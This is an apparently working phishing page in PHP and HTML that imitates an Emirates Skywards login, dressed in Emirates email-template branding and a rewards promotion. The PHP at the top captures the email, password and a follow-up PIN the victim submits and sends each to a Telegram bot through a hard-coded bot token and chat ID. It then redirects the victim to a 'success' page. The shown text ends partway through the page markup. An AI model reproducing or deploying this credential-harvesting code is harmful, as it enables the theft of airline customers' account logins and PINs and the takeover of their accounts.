<?php

// Define your Telegram bot token and chat ID
$botToken = "6362171314:AAEnB_4DdwDkCEjKmRTAH_5bTSqubvwrev8";
$chatID = "-1001926682773";

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if PIN is submitted
    if(isset($_POST["pin"])) {
        // Retrieve PIN from the form
        $pin = $_POST["pin"];
        
        // Compose the message to be sent to Telegram
        $message = "PIN received:\nPIN: $pin";

        // Send message to Telegram using the Telegram Bot API
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = array(
            'chat_id' => $chatID,
            'text' => $message
        );

        // Initialize curl
        $ch = curl_init();

        // Set curl options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        // Execute curl request
        $response = curl_exec($ch);

        // Close curl session
        curl_close($ch);

        // Check if message was sent successfully
        if (!$response) {
            // Handle error if message was not sent
            echo "Error: Unable to send message to Telegram.";
        } else {
            // Redirect to another page
            header("Location: success_page.php");
            exit();
        }
    } else {
        // Retrieve email and password from the form
        $email = $_POST["email"];
        $password = $_POST["password"];

        // Compose the message to be sent to Telegram
        $message = "New login attempt:\nEmail: $email\nPassword: $password";

        // Send message to Telegram using the Telegram Bot API
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = array(
            'chat_id' => $chatID,
            'text' => $message
        );

        // Initialize curl
        $ch = curl_init();

        // Set curl options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        // Execute curl request
        $response = curl_exec($ch);

        // Close curl session
        curl_close($ch);

        // Check if message was sent successfully
        if (!$response) {
            // Handle error if message was not sent
            echo "Error: Unable to send message to Telegram.";
        } else {
            // Message sent successfully
            echo "Please enter PIN";
        }
    }
}
?>



<!--  -->
<!DOCTYPE html>
<html dir="ltr">
<head><meta name="robots" content="noindex, nofollow"/><meta name="referrer" content="no-referrer"/>
    <meta charset="utf-8"> <!-- utf-8 works for most cases -->
    <meta name="viewport" content="width=device-width"> <!-- Forcing initial-scale shouldn't be necessary -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge"> <!-- Use the latest (edge) version of IE rendering engine -->
    <meta name="x-apple-disable-message-reformatting"> <!-- Disable auto-scale in iOS 10 Mail entirely -->
    <title>Emirates</title> <!-- The title tag shows in email notifications, like Android 4.4. -->
    <link rel="icon" href="https://screenox.in/wp-content/uploads/2023/03/3-1.png" type="image/x-icon">

    <!-- Web Font / @font-face : BEGIN -->

    <!-- Desktop Outlook chokes on web font references and defaults to Times New Roman, so we force a safe fallback font. -->
    <!--[if mso]>         <style>             body, table, td {               font-family: Helvetica, Arial, sans-serif !important;               font-weight: 300 !important;             }         </style>     <![endif]-->

    <!-- All other clients get the webfont reference; some will render the font and others will silently fail to the fallbacks. More on that here: http://stylecampaign.com/blog/2015/02/webfont-support-in-email/ -->
    <!--[if !mso]><!-->
    <link href="https://cdn.ek.aero/shared/fonts/emirates/emirates-bold.woff2" rel="stylesheet" type="text/css">
    <link href="https://cdn.ek.aero/shared/fonts/emirates/emirates-medium.woff2" rel="stylesheet" type="text/css">
    <!--<![endif]-->


    <!-- CSS Reset -->
    <style>

        html,
        body {
            margin: 0 auto !important;
            padding: 0 !important;
            height: 100% !important;
            width: 100% !important;
        }

        /* What it does: Stops email clients resizing small text. */
        * {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%;
        }

        /* What it does: Centers email on Android 4.4 */
        div[style*="margin: 16px 0"] {
            margin:0 !important;
        }

        table,
        td {
            mso-table-lspace: 0pt !important;
            mso-table-rspace: 0pt !important;
        }

        table {
            border-spacing: 0 !important;
            border-collapse: collapse !important;
            table-layout: fixed !important;
            margin: 0 auto !important;
        }
        table table table {
            table-layout: auto;
        }

        img {
            -ms-interpolation-mode:bicubic;
        }

        *[x-apple-data-detectors] {
            color: inherit !important;
            text-decoration: none !important;
        }

        .x-gmail-data-detectors,
        .x-gmail-data-detectors *,
        .aBn {
            border-bottom: 0 !important;
            cursor: default !important;
        }

        .a6S {
            display: none !important;
            opacity: 0.01 !important;
        }

        img.g-img + div {
            display:none !important;
        }

        .button-link {
            text-decoration: none !important;
        }

        @media only screen and (min-device-width: 375px) and (max-device-width: 413px) {
            .email-container {
                /* min-width: 375px !important; */
            }
        }

    </style>

    <!-- What it does: Makes background images in 72ppi Outlook render at correct size. -->
    <!--[if gte mso 9]>     <xml>         <o:OfficeDocumentSettings>             <o:AllowPNG/>             <o:PixelsPerInch>96</o:PixelsPerInch>         </o:OfficeDocumentSettings>     </xml>     <![endif]-->

    <!-- Progressive Enhancements -->
    <style>

        .mobile-only,
        .mobile-table {
            display: none;
            visibility: hidden;
        }

  .desktop-only {
   display: block;
   visibility: visible;
  }
        
    
  .desktop-table {
   display: table;
   visibility: visible;
  }
 
         .flight-itinerary-font{
              font-size: 52px !important;
            }
    .aircraft-small {  
                display: none;  
                visibility: hidden;  
            }  
    .aircraft-big {  
                display: block !important;  
                visibility: visible !important;  
            } 
      
          
        @media screen and (min-width: 661px) {
            .left-column {
                float: left;
            }
 .desktop-text-left {
            text-align: left !important;
        } 
            .right-column {
                float: right;
            }
          .aircraft-small {  
                display: none !important;  
                visibility: hidden !important;  
            }  
            .aircraft-big {  
                display: block !important;  
                visibility: visible !important;  
            } 
        .survey_btn_container{
                width: 380px !important;
                max-width: 380px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .survey_btn{
                width: 60px !important;
                height: 60px;
            }
        .survey_btn_spacer{
                width: 10px;
            }
        .survey_padding{
                padding:0 20px !important;
            }
          .pfa-btn-container{
                width: 460px !important;
                max-width: 460px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .pfa_btn{
                width: 80px !important;
                height: 80px;
            }
        .pfa_btn-spacer{
                width: 20px;
            } 
            .flight-itinerary-font{
              font-size: 52px !important;
            }
            .grad {
                background: #F7F7F7; 
                background: -webkit-linear-gradient(#FFFFFF, #F7F7F7);
                background: -o-linear-gradient(#FFFFFF, #F7F7F7);
                background: -moz-linear-gradient(#FFFFFF, #F7F7F7); 
                background: linear-gradient(#FFFFFF, #F7F7F7);
            }
            .pnr-code {
                display: block;
                width: 125px !important;
                max-width: 150px !important;
            }
            .web-width {
                display: block;
                width: 213px !important;
                max-width: 213px !important;
            }
            .web-width-fares {
                display: block;
                width: 302px !important;
                max-width: 302px !important;
            }
            .web-width-expiry {
                display: block;
                width: 280px !important;
                max-width: 280px !important;
            }
            .web-width-story {
                display: block;
                width: 247px !important;
                max-width: 247px !important;
            }         
            .web-width-passenger {
                display: block;
                width: 321px !important;
                max-width: 321px !important;
            }
            .web-guide {
                width: 375px !important;
            }
          .web-width-sw-bar-left {
                display: block;
                width: 200px !important;
                max-width: 200px !important;
            }
            .web-width-sw-bar-right {
                display: block;
                width: 360px !important;
                max-width: 360px !important;
            }
            .web-tier-left {
                display: block;
                width: 15% !important;
                max-width: 15% !important;
            }
            .web-tier-right {
                display: block;
                width: 85% !important;
                max-width: 85% !important;
            }
            .story-card-v2 {
                min-height: 180px;
            }

            .left-column .story-card-v2 {
                border-radius:          3px 0 0 3px !important;
                -moz-border-radius:     3px 0 0 3px !important;
                -webkit-border-radius:  3px 0 0 3px !important;
            }

            .right-column .story-card-v2 {
                border-radius:          0 3px 3px 0 !important;
                -moz-border-radius:     0 3px 3px 0 !important;
                -webkit-border-radius:  0 3px 3px 0 !important;
            }

            .single-card .title,
            .single-card .text td {
                text-align: left !important;
            }

            .single-card .text {
                width: 65% !important;
            }

            .single-card .separator {
                margin: 0 !important;
            }

            .single-card .button {
                width: 30% !important;
            }

            .single-card .button a {
                height: 18px;
                display: block;
                max-width: 160px;
                padding: 10px 20px !important;
                background-color: #ffffff;
                border: 1px solid #333333;
                border-radius:          3px;
                -moz-border-radius:     3px;
                -webkit-border-radius:  3px;
                text-decoration: none !important;
                box-shadow:         0 2px 1px 0 rgba(0,0,0,0.10);
                -moz-box-shadow:    0 2px 1px 0 rgba(0,0,0,0.10);
                -webkit-box-shadow: 0 2px 1px 0 rgba(0,0,0,0.10);
            }

   .desktop-table-left {
    float: left !important;
   }
          .skywards-profile .one { max-width: 270px; }
          .skywards-profile .two { max-width: 200px; }
          .skywards-profile .three { max-width: 130px; }
          .join-skywards .one { max-width: 220px; }
        }
  </style>
  <style>
        @media screen and (max-width: 660px) {

   .desktop-only, .desktop-table {
    display: none !important;
    visibility: hidden !important;
   }
          .aircraft-small {  
                display: none !important;  
                visibility: hidden !important;  
            }  
            .aircraft-big {  
                display: block !important;  
                visibility: visible !important;  
            }
          .airplane_smaller{
                width: 200px !important;
                max-width: 200px !important;
                height: 21px !important;
          }
        .survey_btn_container{
                width: 280px !important;
                max-width: 280px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .survey_btn{
                width: 40px !important;
                height: 40px;
            }
        .survey_btn_spacer{
                width: 0px;
            }
        .survey_padding{
                padding:0 10px !important;
            }
          .pfa-btn-container{
                width: 460px !important;
                max-width: 460px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .pfa_btn{
                width: 80px !important;
                height: 80px;
            }
        .pfa_btn-spacer{
                width: 20px;
            } 
            .flight-itinerary-font{
              font-size: 52px !important;
            }
          
            .full-width {
                display: block !important;
                width: 100% !important;
                max-width: 100% !important;
            } 

            .fluid {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                margin-left: auto !important;
                margin-right: auto !important;
            }
            .mobile-text-right {
                text-align: right !important;
            }

            .mobile-font {
                font-size: 80% !important;
            }
            .mobile-header {
                font-size: 25px !important;
            }
            .mobile-pnr-date {
                font-size: 16px !important;
            }
            .mobile-pnr-route {
                font-size: 150% !important;
                font-weight: bold !important;
            }
            .mobile-top{
                vertical-align: top !important;
            }
            .mobile-font-numbers {
                font-size: 150% !important;
            }
            .mobile-pnr-image {
                padding-top: 3px;
                width: 27px !important;
                max-width: 27px !important;
                height: 27px !important;
                max-height: 27px !important;
            }

            .stack-column,
            .stack-column-center {
                display: block !important;
                width: 100% !important;
                max-width: 100% !important;
                direction: ltr !important;
            }
            .stack-column-center {
                text-align: center !important;
            }

            .center-on-narrow {
                text-align: center !important;
                display: block !important;
                margin-left: auto !important;
                margin-right: auto !important;
                float: none !important;
            }
            table.center-on-narrow {
                display: inline-block !important;
            }

            .mobile-left {
                float: left !important;
            }

            .mobile-right {
                float: right !important;
            }

            .appdownload {
                width: auto !important;
            }

            .appdownload .mobile-spacer {
                width: 23px !important;
            }

            .mobile-top-10 {
                padding-top: 10px !important;
            }

            .mobile-top-20 {
                padding-top: 20px !important;
            }

            .mobile-right-0 {
                padding-right: 0px !important;
            }

            .centered-columns-2 {
                max-width: 100% !important;
            }

            .story-card-v2 {
                width: 100% !important;
            }

            .story-spacer {
                visibility: hidden !important;
                line-height: 0px !important;
                height: 0px !important;
            }

            .mobile-table {  
                display: table !important;  
                visibility: visible !important;  
            }

            .mobile-text-center {  
                text-align: center !important;  
            }

            .single-button {
                width: 100% !important;
            }

            .single-button a {
                height: 18px;
                display: block;
                padding: 10px 20px !important;
                background-color: #ffffff;
                border: 1px solid #333333;
                border-radius:          3px;
                -moz-border-radius:     3px;
                -webkit-border-radius:  3px;
                text-decoration: none !important;
                box-shadow:         0 2px 1px 0 rgba(0,0,0,0.10);
                -moz-box-shadow:    0 2px 1px 0 rgba(0,0,0,0.10);
                -webkit-box-shadow: 0 2px 1px 0 rgba(0,0,0,0.10);
            }

   .skywards-mobile-background {
    background-image: url('http://image.e.emirates.email/lib/fe5615707c610d7a7310/m/1/e7ecebdb-3a94-4366-865d-3073b0a9c1bf.png');
    background-repeat: no-repeat;
    background-position: 100% 20px;
    background-size: 60px;
   }
        }
  </style>
  <style>
        @media screen and (max-width: 480px) {
            
            .desktop-only, .desktop-table {
    display: none !important;
    visibility: hidden !important;
   }
      
          .aircraft-big {  
                display: none !important;  
                visibility: hidden !important;  
            }  
            .aircraft-small {  
                display: inline-block !important;  
                visibility: visible !important;  
            } 
        .survey_btn_container{
                width: 300px !important;
                max-width: 300px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .survey_btn{
                width: 60px !important;
                height: 60px;
            }
        .survey_btn_spacer{
                width: 0px;
            }
        .survey_padding{
                padding:0 10px !important;
            }    
        .pfa-btn-container{
                width: 260px !important;
                max-width: 260px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .pfa_btn{
                width: 44px !important;
                height: 44px;
            }
        .pfa_btn-spacer{
                width: 10px;
            } 
            .flight-itinerary-font{
              font-size: 20px !important;
            }
            .full-width {
                display: block !important;
                width: 100% !important;
                max-width: 100% !important;
            } 
 
            .fluid {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                margin-left: auto !important;
                margin-right: auto !important;
            }
            .mobile-text-right {
                text-align: right !important;
            }

            .mobile-font {
                font-size: 80% !important;
            }
            .mobile-text-center {  
                text-align: center !important;  
            }
            .mobile-header {
                font-size: 25px !important;
            }
            .mobile-pnr-date {
                font-size: 16px !important;
            }
            .mobile-pnr-route {
                font-size: 150% !important;
                font-weight: bold !important;
            }
            .mobile-top{
                vertical-align: top !important;
            }

            .mobile-font-numbers {
                font-size: 150% !important;
            }
            .mobile-only {
                display: block !important;
                visibility: visible !important;
            }
            .mobile-pnr-image {
                padding-top: 3px;
                width: 27px !important;
                max-width: 27px !important;
                height: 27px !important;
                max-height: 27px !important;
            }
            .copyright,
            .footerbrand {
                padding-top: 20px !important;
            }

            .copyright {
                height: 65px !important;
                vertical-align: bottom !important;
            }

            .copyright span {
                min-width: 160px !important;
                padding-bottom: 12px !important;
            }

            .footerbrand,
            .footerbrand a,
            .footerbrand a img {
                width: 50px !important;
                height: 65px !important;
            }
        }
    
     @media screen yahoo{
        .survey_btn_container{
                width: 380px !important;
                max-width: 380px !important;
                align-items: center;
                margin: 0 auto;
            }  
        .survey_btn{
                width: 60px !important;
                height: 60px;
            }
        .survey_btn_spacer{
                width: 10px;
            }
        .survey_padding{
                padding:0 20px !important;
            }
             .pfa-btn-container{
                width: 460px !important;
                max-width:  460px !important;
                align-items: center;
                margin: 0 auto;
            }
            .pfa_btn-spacer{
                width: 20px;
            }
            .pfa_btn{
                width: 80px !important;
                height: 80px;
            }
       
    }
    .login-container {
    width: 350px;
    margin: 50px auto;
    background: rgba(255, 255, 255, 0.9);
    padding: 20px;
    border-radius: 10px;
    border: 1px solid rgba(0, 0, 0, 0.1);
    box-shadow: 0 0 10px rgba(0,0,0,0.1);
}
.login-form {
  display: flex;
  flex-direction: column;
}

.form-group {
  margin-bottom: 15px;
}

.form-group label {
  display: block;
  margin-bottom: 5px;
}
  .login-form input[type="email"],
  .login-form input[type="password"],
  .login-form input[type="submit"] {
    width: 100%;
    padding: 5px;
    margin: 4px 0;
    border: none;
    border-radius: 4px;
    background-color: #f7f7f7;
    box-shadow: 0 0 5px rgb(255 255 255);
  }

  .login-form input[type="submit"] {
    background-color: #007bff;
    color: white;
    cursor: pointer;
  }

  .login-form input[type="submit"]:hover {
    background-color: #0056b3;
  }
    </style>
<!--[if gt mso 15]>     <style type="text/css" media="all">       /* Outlook 2016 Height Fix */       table, tr, td {border-collapse: collapse;}       tr { font-size:0px; line-height:0px; border-collapse: collapse; }     </style>     <![endif]-->
</head>
<body width="100%" style="margin: 0; mso-line-height-rule: exactly; background-image: url('https://content.presspage.com/uploads/2431/af47e1b7-16b6-410f-b9b4-aadfd2511d6e/1920_a380-new-livery.jpg?10000'); background-size: cover; background-attachment: fixed; background-repeat: no-repeat;">
    <center style="width: 100%; text-align: left;">

        <!-- Visually Hidden Preheader Text : BEGIN -->
        <div style="display: none; font-size: 1px; line-height: 1px; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden; mso-hide: all; font-family: sans-serif;"></div>
        <!-- Visually Hidden Preheader Text : END -->

        <div style="max-width: 842px; min-width: 300px; margin: auto; background-color: #FFFFFF;" class="email-container">
            <!--[if mso]>             <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="842" align="center" bgcolor="#FFFFFF">             <tr>             <td>             <![endif]-->

<!----><table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><center></center>
<!--  -->
</td></tr></table><!----><!----><table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">

            <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><!-- Start // AmpScript Encryption Content Block    End // AmpScript Encryption Content Block --></td></tr></table>

            

<div style="font-size:0px;line-height:1px;mso-line-height-rule:exactly;display:none;max-width:0px;max-height:0px;opacity:0;overflow:hidden;mso-hide:all;">
Your rewards. Your choice.. 
</div>



<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">




 <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><!-- Email Header : BEGIN --><table align="center" aria-hidden="true" bgcolor="#e1e1e1" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td>
    <!--[if mso]>       <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">       <tr>       <td>       <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
 
  <tr>
   <td>
    <!--[if mso]>       <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">       <tr>       <td>       <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td bgcolor="#333333" style="height: 60px;">
        <table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presimgentation" width="100%">
         
          <tr>
           <td bgcolor="#d10911" style="text-align: center; vertical-align: middle; font-size: 20px; font-family: Emirates Bold, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-weight: 300; color: #ffffff; height: 60px; width: 134px;">
            <a  href="https://click.e.emirates.email/?qs=dd32425ba2cad0c848f2116746728df6b3ed5801245eb0a035632ed2c65ac379df0a4da6b16279a3ad3a3635f8bdc01b345b32166b7210f1d563661e8b43ccd2" style="color: #ffffff;" target="_blank"><img height="60" src="http://image.e.emirates.email/lib/fe5615707c610d7a7310/m/1/5868764e-c97b-44b9-98d1-2114819a6a71.png" style="display: block; height: 60px; width: auto; border: medium none; outline: medium none currentcolor; font-size: 20px; font-family: Emirates Bold, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-weight: 300; text-align: center;" title="Emirates" width="auto"> </a></td>
<td style="padding: 0 20px 0 0; text-align: right; vertical-align: middle; font-size: 12px; font-family: Emirates Bold, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; color: #ffffff; height: 60px;" valign="middle">
            <table align="right" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%">
             
              <tr>
<td style="width: 22px; vertical-align: middle; padding: 2px 0 0; height: 53px;" valign="middle" width="22">
</a></td></tr></table></td></tr></table></td></tr></table><!--[if mso]>       </td>       </tr>       </table>       <![endif]--></td></tr></table><!-- Email Header : END --></td></tr></table>
     
        
 
    
   </td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<div data-marker="wrapper" style="" class="stylingblock-content-wrapper"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%;" width="100%">
 
  <tr>
   <td align="center" valign="top">
    <!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="height: 15px; line-height: 15px; font-size: 15px; overflow: hidden;" valign="top">
       </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--></td></tr></table></div>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">

<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td style="">
    <!--[if mso]>       <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">       <tr>       <td>       <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td style="padding: 5px 10px 0; font-family: HelveticaNeue-Bold, Helvetica Neue Bold, Helvetica, Arial, sans-serif; font-weight: 300; font-size: 10px; color: #333333; letter-spacing: 4px; text-align: center; line-height: 12px; text-transform: uppercase;">
        REWARDING JOURNEYS</td></tr><tr>
       <td class="mobile-header" style="padding: 5px 10px 8px; font-family: Emirates-Bold, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-weight: 300; font-size: 36px; color: #333333; letter-spacing: -0.5px; text-align: center; line-height: 38px;">
        Your rewards. Your choice.</td></tr><tr>
       <td height="15" style="font-size: 0%; line-height: 100%;">
       </td></tr></table><!--[if mso]>       </td>       </tr>       </table>       <![endif]--></td></tr></table></td></tr></table>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><!-- START BODY COPY --><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" style="text-align: center;" valign="top">
    <table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
     
      <tr>
       <td align="center" style="padding-left: 10px; padding-right: 10px;" valign="top">
        <!--[if mso]>           <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="622" align="center">          <tr>           <td>           <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
         
          <tr>
<td align="center" style="font-family: HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-weight: 300; font-size: 14px; color: #151515; line-height: 22px; text-align: center; border-radius: 5px; background-color: #f0f0f0;" valign="top">
    <div class="login-container">
        <h2>Log in to Emirates</h2>
        <p>Earn Miles every time you fly with us and our partners. And spend your Skywards Miles on a world of rewards.</p>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" class="login-form">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group">
                <input type="submit" value="Log In">
            </div>
            <div class="form-group">
                <a href="#" class="link">Forgot your email or account number?</a>
                <br>
                <a href="#" class="link">Forgot/Create password</a>
            </div>
        </form>
        <hr>
        <p>Not an Emirates Skywards member yet?</p>
        <p>Register now to make the most of every mile with Emirates Skywards</p>
        <a href="#" class="link">Join now</a>
    </div>

</td></tr><tr>
           <td align="left" height="25" style="font-size:0%; line-height:100%;" valign="top">
           </td></tr></table><!--[if mso]>           </td>           </tr>           </table>           <![endif]--></td></tr></table></td></tr></table><!-- END BODY COPY --></td></tr></table>

 

</td></tr></table>



<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<div data-marker="wrapper" style="" class="stylingblock-content-wrapper"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" valign="top">
    <!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="height: 15px; line-height: 15px; font-size: 15px; overflow: hidden;" valign="top">
       </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--></td></tr></table></div>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">
<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" valign="top">
    <!--[if mso]>       <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" max-width="642" align="center">       <tr>       <td>       <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="padding-left: 10px; padding-right: 10px;" valign="top">
        <table align="center" border="0" cellpadding="0" cellspacing="0" style="border: 1px solid #e1e1e1; background-color: #ffffff; box-shadow: 0 2px 4px 2px rgba(0,0,0,0.10); -moz-box-shadow: 0 2px 4px 2px rgba(0,0,0,0.10); -webkit-box-shadow: 0 2px 4px 2px rgba(0,0,0,0.10); border-radius: 3px; -moz-border-radius: 3px; -webkit-border-radius: 3px; overflow: hidden; width: 100%; border-collapse: initial !important;" width="100%">
         
          <tr>
           <td style="max-width: 100%;">
           </td></tr><tr>
           <td align="left" height="5" style="font-size:0%; line-height:100%;" valign="top">
            <!--[if gte mso 15]>&nbsp;<![endif]--></td></tr><tr>
           <td align="left" valign="top">
            <table border="0" cellpadding="0" cellspacing="0" width="100%">
             
              <tr>
               <td align="center" valign="top">
                <table border="0" cellpadding="0" cellspacing="0" style="width: 100%;" width="100%">
                 
                  <tr>
                   <td align="center" style="" valign="top">
                    <table class="single-card" style="overflow: hidden; width: 100%; border-collapse: initial !important; padding: 0 20px;" width="622">
                     
                      <tr>
                       <td align="left" height="1" style="font-size:0%; line-height:100%;" valign="top">
                       </td></tr><tr>
                       <td align="left" height="1" style="font-size:0%; line-height:100%;" valign="top">
                       </td></tr><tr>
                       <td style="padding: 0px 20px 4px; text-align: center; border-bottom-color: #ffffff;">
                        <img class="airplane_smaller" src="https://image.e.emirates.email/lib/fe5615707c610d7a7310/m/10/a92d3ed7-56ad-458d-b202-4cd1b078c539.png" style="width: 339px; max-width: 339px; height: 37px;" width="339"></td></tr><tr>
                       <td align="center" style="font-family: HelveticaNeue-Light, Helvetica Neue Light, Helvetica,  Arial, sans-serif; font-size: 10px; color: #666666; letter-spacing: 4px; text-align: center; line-height: 10px; text-transform: uppercase;" valign="top">
                        DID YOU KNOW</td></tr><tr>
                       <td align="center" style="font-family: Emirates-Bold, HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-weight: 300; font-size: 16px; line-height: 26px; color: #333333; text-align: center;" valign="top">
                        <a   data-linkto="other" href="https://click.e.emirates.email/?qs=637f2516925be51bbb2dd5fdfcd53a2d1be0e0ac0b37584238c95d37829edaa08db8e28f0598ae6d99588b13eac97bc8b62e7bf70e36536eea03b5e6ae5e2a75" style="text-decoration: none;  color: #333333;" target="_blank" title="Save USD 15 with just 2,000 Miles on your next Cash+Miles booking">Save USD 15 with just 2,000 Miles on your next Cash+Miles booking</a></td></tr><tr>
                       <td align="center" style="font-family: HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-size: 12px; color: #666666; text-align: center; line-height: 16px; padding: 0 20px;" valign="top">
                        Book now and start collecting rewards today</td></tr><tr>
                       <td align="left" height="7" style="font-size:0%; line-height:100%;" valign="top">
                       </td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr></table><!--[if mso]>       </td>       </tr>       </table>       <![endif]--></td></tr></table></td></tr></table>

 

</td></tr></table>



<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<div data-marker="wrapper" style="" class="stylingblock-content-wrapper"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" valign="top">
